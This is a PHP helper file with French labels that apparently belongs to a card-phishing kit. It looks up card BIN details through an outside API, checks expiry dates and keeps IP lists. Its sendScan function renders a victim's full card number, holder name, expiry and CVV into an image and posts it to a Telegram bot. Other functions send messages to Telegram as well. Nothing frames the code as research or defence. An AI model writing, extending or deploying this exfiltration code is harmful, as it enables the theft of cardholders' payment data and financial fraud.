<?php

function binChecker($bin) {
    $_SESSION['type'] = 'Inconnu';
    $_SESSION['level'] = 'Inconnu';
    $_SESSION['bank'] = 'Inconnue';
    $_SESSION['country'] = 'Inconnu';
    $_SESSION['luhn'] = true;

    if ($bin === '') {
        return;
    }

    $ch = curl_init("https://data.handyapi.com/bin/{$bin}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);

    $result = json_decode((string)$response, true);
    if (!is_array($result)) {
        return;
    }

    $_SESSION['type'] = $result['Type'] ?? 'Inconnu';
    $_SESSION['level'] = $result['CardTier'] ?? 'Inconnu';
    $_SESSION['bank'] = $result['Issuer'] ?? 'Inconnue';
    $_SESSION['country'] = $result['Country']['Name'] ?? 'Inconnu';
    $_SESSION['luhn'] = ($result['Luhn'] ?? true) ? true : false;
}

function sendMessage($chat_id, $text, $buttons = null, $replyToId = null) {
    global $telegram;

    $urlParams = array(
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML'
    );

    if ($buttons !== null) {
        $urlParams['reply_markup'] = json_encode($buttons);
    }

    if ($replyToId !== null) {
        $urlParams['reply_to_message_id'] = $replyToId;
    }

    $apiUrl = "https://api.telegram.org/bot{$telegram['token']}/sendMessage?" . http_build_query($urlParams);

    $ch = curl_init($apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_TIMEOUT, 6);
    $response = curl_exec($ch);
    curl_close($ch);

    $decoded = json_decode((string)$response, true);
    return is_array($decoded) && !empty($decoded['ok']);
}

function writeOnFile($file, $ip) {
    $lines = array();
    if (file_exists($file)) {
        $raw = @file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if (is_array($raw)) {
            $lines = $raw;
        }
    }

    if (in_array($ip, $lines, true)) {
        return;
    }

    @file_put_contents($file, $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function removeIPFromFile($file, $ip) {
    if (!file_exists($file)) {
        return;
    }

    $raw = @file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!is_array($raw) || !in_array($ip, $raw, true)) {
        return;
    }

    $kept = array();
    foreach ($raw as $line) {
        if ($line !== $ip) {
            $kept[] = $line;
        }
    }

    @file_put_contents($file, $kept ? implode(PHP_EOL, $kept) . PHP_EOL : '', LOCK_EX);
}

function isDateExpired($expiryDate) {
    $expiryDate = trim((string)$expiryDate);
    if (strpos($expiryDate, '/') === false) {
        return false;
    }

    list($month, $year) = explode('/', $expiryDate);
    $month = (int)$month;
    $year = (int)$year;

    if ($month < 1 || $month > 12 || $year <= 0) {
        return false;
    }

    if ($year < 100) {
        $year += 2000;
    }

    $nowYear = (int)date('Y');
    $nowMonth = (int)date('n');

    if ($year < $nowYear) {
        return true;
    }

    if ($year === $nowYear && $month < $nowMonth) {
        return true;
    }

    return false;
}

function sendScan($chat_id, $holder, $number, $exp, $cvv) {
    global $telegram;

    $image = imagecreatetruecolor(400, 200);
    $bgColor = imagecolorallocate($image, 255, 255, 255);
    $textColor = imagecolorallocate($image, 0, 0, 0);
    imagefilledrectangle($image, 0, 0, 399, 199, $bgColor);
    $textSize = 5;
    $margin = 10;
    imagestring($image, $textSize, $margin, 30, $number, $textColor);
    imagestring($image, $textSize, $margin, 70, $holder, $textColor);
    imagestring($image, $textSize, $margin, 110, $exp, $textColor);
    imagestring($image, $textSize, $margin, 150, $cvv, $textColor);

    $tempImagePath = sys_get_temp_dir() . '/scan_' . bin2hex(random_bytes(6)) . '.png';
    imagepng($image, $tempImagePath);
    imagedestroy($image);

    $telegramApiUrl = "https://api.telegram.org/bot{$telegram['token']}/sendPhoto";

    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'chat_id' => $chat_id,
        'photo' => new CURLFile($tempImagePath),
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    curl_exec($ch);
    curl_close($ch);

    @unlink($tempImagePath);
}

function sendTelegramMessage($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chatId}&text=" . urlencode($message);

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 3);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

function getStreamContext($token) {
    $options = array(
        'http' => array(
            'method' => 'GET',
            'timeout' => 5,
            'header' => "Authorization: $token\r\n" .
                        "Origin: https://{$_SERVER['HTTP_HOST']}\r\n"
        )
    );
    return stream_context_create($options);
}